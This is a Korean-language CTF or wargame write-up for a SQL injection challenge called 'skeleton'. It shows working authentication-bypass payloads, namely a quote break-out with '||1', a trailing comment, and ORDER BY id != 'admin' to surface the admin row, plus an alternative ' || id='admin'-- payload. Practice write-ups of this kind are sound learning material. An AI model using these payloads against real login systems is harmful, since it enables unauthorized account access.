## Q10. skeleton _ order by 활용
<img src="/photo/prob_10.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: X <br> 문제 사항: id=admin을 만들어내라.
### 해결책

```
GET값 싱글쿼터에 의해 문자열 취급
=> 싱글쿼터를 이용해 문자열 탈출 
```
```diff
# 현재 쿼리문: where id='guest' and pw=''||1' and 1=0
```
```
but. 1 뒤의 내용 문제 일으킴
=> 주석 처리
```
```diff
# 현재 쿼리문: where id='guest' and pw=''||1-- ' and 1=0
```
```
현재 || 1에 의해서 쿼리문은 참
=> 테이블이 준비됨
=> 준비된 테이블에서 id='admin'만 고르면 됨
=> 데이터 값 정렬해주는 ORDEY BY 이용
=> BY 뒤에 조건(id='admin')을 줌
```
```
해결 쿼리문: where id='guest' and pw=''||1 order by id != 'admin' asc-- ' and 1=0
```
### CERT <br> ?pw='||1 order by id != 'admin' asc--+

### 느낀점
```diff
+ ORDER BY 함수에 대해 배웠다.
+ 기본 구조: ORDER BY column_name(조건) <속성>
+ 속성: ASC( 오름차순 )
+       DESC ( 내림차순 )
+ 조건: id!='특정값' asc : 특정값 최상단 정렬
+       id ='특정값' desc : 특정값 최하단 정렬  
```

### 다른 풀이
1. ?pw=' || id='admin'--+
   - 싱글쿼터를 추가해 문자열 탈출
   - => id='admin' 조건을 적어줌
   - => 뒤의 내용 오류 일으킴
   - => id='admin' 뒤 주석 처리
